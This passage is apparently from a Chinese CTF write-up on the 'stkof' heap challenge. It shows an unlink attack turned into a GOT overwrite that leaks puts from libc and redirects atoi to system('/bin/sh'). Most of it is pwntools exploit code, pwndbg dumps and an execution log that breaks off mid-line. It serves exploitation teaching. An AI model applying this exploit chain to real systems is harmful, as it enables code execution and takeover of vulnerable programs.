<p>这里需要注意的是<code>third_chunk的fd</code>与<code>first_chunk的bk</code>更改的其实是一个位置，但是由于 third_fd = first_addr<code>后执行</code>，所以此处内容会从 0x602140 被覆盖成 0x602138<br>最后 free(chunk3)：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#摘除第二步完成，third_chunk</span></span><br><span class="line">pwndbg&gt; x/16gx <span class="number">0x602140</span></span><br><span class="line"><span class="number">0x602140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000e05420</span></span><br><span class="line"><span class="number">0x602150</span>:	<span class="number">0x0000000000602138</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602180</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6021a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6021b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<h2 id="5、泄露函数地址"><a href="#5、泄露函数地址" class="headerlink" title="5、泄露函数地址"></a>5、泄露函数地址</h2><p>好了，上面就是这道题完整的 unlink 过程了，由于这个程序本身并没有 system(“/bin/sh”)，所以接下来需要考虑的就是通过泄露的方式来从 libc 中寻找了。在泄露之前呢，我们先看一下，经过 unlink 之后堆地址指针数组变成了什么样子，因为再怎么说，我们也得从程序修改功能中输入来控制执行流程，所以这部分还得是从指针数组（以下简称 s[]数组）入手：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/16gx <span class="number">0x602140</span></span><br><span class="line"><span class="number">0x602140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000e05420</span> <span class="comment">#s[0] s[1]</span></span><br><span class="line"><span class="number">0x602150</span>:	<span class="number">0x0000000000602138</span>	<span class="number">0x0000000000000000</span> <span class="comment">#s[2] 原s[3]</span></span><br><span class="line"><span class="number">0x602160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>可以看到经过 unlink 之后 chunk 指针数组内部变成了这样。s[1]就是 chunk1 的 data 指针，因为整个过程中 chunk1 并没有使用过，所以 s[1]并无大碍。但是 s[2]的位置原本是 chunk2 的 data 指针，经过 unlink 之后变成了<code>0x602138</code>。最后就是 s[3]了，这里原本是 chunk3 的 data 指针，但是由于前面为了触发 unlink，所以 chunk3 被释放了，所以 s[3]中被置空。<br>那么我们去想，如果我们在主界面选择修改功能，并且选择修改 chunk2，那么实际上输入的内容并不会写进 chunk2，而是写进<code>0x602138</code>：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1601195372253-3b329d49-bc26-4252-b075-3f192fe9220a.png#align=left&display=inline&height=388&margin=%5Bobject%20Object%5D&originHeight=388&originWidth=1950&size=0&status=done&style=none&width=1950"><br>那么这样一来，我们可以通过修改 s[2]的方式来对 s[]数组进行部署函数的 got 地址，再次修改 s[]数组的时候就会修改 got 中的函数地址，这和前面的几篇文章的套路差不多。<br>首先看第一步，向 s[]数组中部署函数 got 地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">&quot;Overwriting global pointers...&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(free_got) + p64(puts_got) + p64(atoi_got)</span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">log.success(<span class="string">&quot;Complete!&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>根据上面的 payload 修改 s[2]：主界面–&gt; 2–&gt; 2–&gt; payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#摘除第一步完成，first_chunk</span></span><br><span class="line">pwndbg&gt; x/16gx <span class="number">0x602138</span></span><br><span class="line"><span class="number">0x602138</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x0000000000602018</span>                 <span class="comment">#free_addr(s[0])</span></span><br><span class="line"><span class="number">0x602148</span>:	<span class="number">0x0000000000e05420</span>	<span class="number">0x0000000000602140</span> <span class="comment">#puts_addr(s[1]) atoi_addr(s[2])</span></span><br><span class="line">            <span class="comment">#fd                 #bk</span></span><br><span class="line"><span class="number">0x602158</span>:	<span class="number">0x0000000000e05980</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602168</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602178</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602188</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602198</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6021a8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>这样一来 free()函数、puts()函数、atoi()函数就已经在 s[]数组中部署好了。可以看到如果再次修改 s[0]的话其实修改的是 free()函数的真实地址，再次修改 s[1]的话其实修改的是 puts()函数的真实地址，再次修改 s[2]的话其实修改的是 atoi()函数的真实地址。<br>那么接下来，如果将 s[0]，即 free()函数 got 中的真实地址修改成 puts_plt 的话，释放调用 free()函数就相当于调用 puts()函数了。那么如果释放的是 s[1]的话就可以泄露出 puts()函数的真实地址了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">&quot;Finding address in program...&quot;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&quot;atoi&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;free@got : 0x%x&quot;</span> % free_got)</span><br><span class="line">log.success(<span class="string">&quot;puts@got : 0x%x&quot;</span> % puts_got)</span><br><span class="line">log.success(<span class="string">&quot;atoi@got : 0x%x&quot;</span> % atoi_got)</span><br><span class="line">log.success(<span class="string">&quot;puts@plt : 0x%x&quot;</span> % puts_plt)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Changing free@got --&gt; puts@plt...&quot;</span>)</span><br><span class="line">payload2 = p64(puts_plt)</span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload2), payload2)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>再次根据上面的 payload 手动修改修改 s[0]：主界面–&gt; 2–&gt; 0–&gt; payload<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1601195372033-fcef2929-4016-4100-9d17-7c3e0d257d78.png#align=left&display=inline&height=286&margin=%5Bobject%20Object%5D&originHeight=286&originWidth=2602&size=0&status=done&style=none&width=2602"><br>接下来就是释放 s[1]了，虽然是调用<code>free(puts_got)</code>，但实际上是<code>puts(puts_got)</code>，需要注意的是我们接收泄露的地址的时候需要用<code>\x00</code>补全，并且用 u64()转换一下才能用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">&quot;Leaking address...&quot;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;FAIL\n&quot;</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&quot;puts address : 0x%x&quot;</span> % puts_addr)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="6、查找-system-函数和-bin-sh-字符串"><a href="#6、查找-system-函数和-bin-sh-字符串" class="headerlink" title="6、查找 system()函数和/bin/sh 字符串"></a>6、查找 system()函数和/bin/sh 字符串</h2><p>这部分就没什么好说的了吧，从栈溢出开始就是这个路子 😂</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">&quot;Finding offset in libc...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">puts_offset = libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;atoi offset: 0x%x&quot;</span> % puts_offset)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Calculating libc address...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">libc_addr = puts_addr - puts_offset</span><br><span class="line">log.success(<span class="string">&quot;Libc address: 0x%x&quot;</span> % libc_addr)</span><br><span class="line">log.info(<span class="string">&quot;Calculating system &amp; /bin/sh address...&quot;</span>)</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_addr + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.success(<span class="string">&quot;system address: 0x%x&quot;</span> % system_addr)</span><br><span class="line">log.success(<span class="string">&quot;/bin/sh address: 0x%x&quot;</span> % binsh)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h2 id="7、拿-shell！"><a href="#7、拿-shell！" class="headerlink" title="7、拿 shell！"></a>7、拿 shell！</h2><p>到了最后一步了，还是用前面的思路，我们将部署在 s[2]中的 atoi_got 中的地址修改成前面找到的 system()函数地址，这样一来在接收字符串调用 atoi()函数的时候实际上调用的是 system()函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">&quot;Changing atoi@got --&gt; system@got...&quot;</span>)</span><br><span class="line">payload3 = p64(system_addr)</span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">len</span>(payload3) + <span class="number">1</span>, payload3)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Now atoi@got is system@got, so just pass the string &#x27;/bin/sh&#x27; to atoi&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Actually we called system(&#x27;/bin/sh&#x27;) !&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.send(p64(binsh))</span><br><span class="line">log.info(<span class="string">&quot;Ready in 5 seconds...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">log.success(<span class="string">&quot;PWN!!&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>再次根据上面的 payload 修改 s[2]：主界面–&gt; 2–&gt; 2–&gt; payload<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1601195372045-7bdbb94b-c535-4fd4-a38e-0ad73f2e1d1c.png#align=left&display=inline&height=288&margin=%5Bobject%20Object%5D&originHeight=288&originWidth=2578&size=0&status=done&style=none&width=2578"><br>最后我们在等待输入的时候输入/bin/sh 字符串的地址就可以了，看起来是<code>atoi(&quot;/bin/sh&quot;)</code>，但实际上执行的是<code>system(&quot;/bin/sh&quot;)</code></p>
<h1 id="exp-详细执行信息"><a href="#exp-详细执行信息" class="headerlink" title="exp 详细执行信息"></a>exp 详细执行信息</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line">➜  unlink_data python exp.py</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x1f7f0 realloc</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x1f800 __tls_get_addr</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x1f820 memalign</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x1f850 _dl_find_dso_for_object</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x1f870 calloc</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x1f8a0 malloc</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x1f8a8 free</span><br><span class="line">[*] <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="literal">-64</span><span class="literal">-little</span></span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x400750 free</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x400760 puts</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x400770 fread</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x400780 strlen</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x400790 __stack_chk_fail</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x4007a0 printf</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x4007b0 alarm</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x4007c0 __libc_start_main</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x4007d0 fgets</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x4007e0 atoll</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x4007f0 __gmon_start__</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x400800 malloc</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x400810 fflush</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x400820 atol</span><br><span class="line">[<span class="type">DEBUG</span>] PLT <span class="number">0</span>x400830 atoi</span><br><span class="line">[*] <span class="string">&#x27;/home/ubuntu/Desktop/unlink_data/stkof_patch&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="literal">-64</span><span class="literal">-little</span></span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0</span>x400000)</span><br><span class="line">[+] Starting local <span class="keyword">process</span> <span class="string">&#x27;./stkof_patch&#x27;</span> argv=[<span class="string">&#x27;./stkof_patch&#x27;</span>] : pid <span class="number">16904</span></span><br><span class="line">[*] Creating chunk1, avoid stdout<span class="string">&#x27;s buffer.</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">1</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x4 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">256</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x5 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">1</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &#x27;</span>OK\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[*] Creating chunk2...</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">1</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x3 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">48</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x5 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">2</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &#x27;</span>OK\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[*] Creating chunk3...</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">1</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x4 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">128</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x5 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">3</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &#x27;</span>OK\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[*] Creating fake chunk...</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">2</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">2</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x3 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">64</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x41 bytes:</span></span><br><span class="line"><span class="string">    00000000  00 00 00 00  00 00 00 00  30 00 00 00  00 00 00 00  │····│····│0···│····│</span></span><br><span class="line"><span class="string">    00000010  38 21 60 00  00 00 00 00  40 21 60 00  00 00 00 00  │8!`·│····│@!`·│····│</span></span><br><span class="line"><span class="string">    00000020  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span></span><br><span class="line"><span class="string">    00000030  30 00 00 00  00 00 00 00  90 00 00 00  00 00 00 00  │0···│····│····│····│</span></span><br><span class="line"><span class="string">    00000040  0a                                                  │·│</span></span><br><span class="line"><span class="string">    00000041</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x8 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span>OK\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &#x27;</span>FAIL\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[*] Now we have fake chunks, just free chunk3 to change global pointer...</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">3</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">3</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x3 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span>OK\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[+] Global pointer has been changed!</span></span><br><span class="line"><span class="string">[*] Finding address in program...</span></span><br><span class="line"><span class="string">[+] free@got : 0x602018</span></span><br><span class="line"><span class="string">[+] puts@got : 0x602020</span></span><br><span class="line"><span class="string">[+] atoi@got : 0x602088</span></span><br><span class="line"><span class="string">[+] puts@plt : 0x400760</span></span><br><span class="line"><span class="string">[*] Overwriting global pointers...</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">2</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">2</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x3 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">32</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x21 bytes:</span></span><br><span class="line"><span class="string">    00000000  61 61 61 61  61 61 61 61  18 20 60 00  00 00 00 00  │aaaa│aaaa│· `·│····│</span></span><br><span class="line"><span class="string">    00000010  20 20 60 00  00 00 00 00  88 20 60 00  00 00 00 00  │  `·│····│· `·│····│</span></span><br><span class="line"><span class="string">    00000020  0a                                                  │·│</span></span><br><span class="line"><span class="string">    00000021</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x8 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span>OK\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &#x27;</span>FAIL\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[+] Complete!</span></span><br><span class="line"><span class="string">[*] Changing free@got --&gt; puts@plt...</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">2</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">0</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">8</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x9 bytes:</span></span><br><span class="line"><span class="string">    00000000  60 07 40 00  00 00 00 00  0a                        │`·@·│····│·│</span></span><br><span class="line"><span class="string">    00000009</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x8 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span>OK\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &#x27;</span>FAIL\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[*] Leaking address...</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">3</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">1</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Received 0xa bytes:</span></span><br><span class="line"><span class="string">    00000000  a0 f6 50 a8  38 7f 0a 4f  4b 0a                     │··P·│8··O│K·│</span></span><br><span class="line"><span class="string">    0000000a</span></span><br><span class="line"><span class="string">[+] puts address : 0x7f38a850f6a0</span></span><br><span class="line"><span class="string">[*] Finding offset in libc...</span></span><br><span class="line"><span class="string">[+] atoi offset: 0x6f6a0</span></span><br><span class="line"><span class="string">[*] Calculating libc address...</span></span><br><span class="line"><span class="string">[+] Libc address: 0x7f38a84a0000</span></span><br><span class="line"><span class="string">[*] Calculating system &amp; /bin/sh address...</span></span><br><span class="line"><span 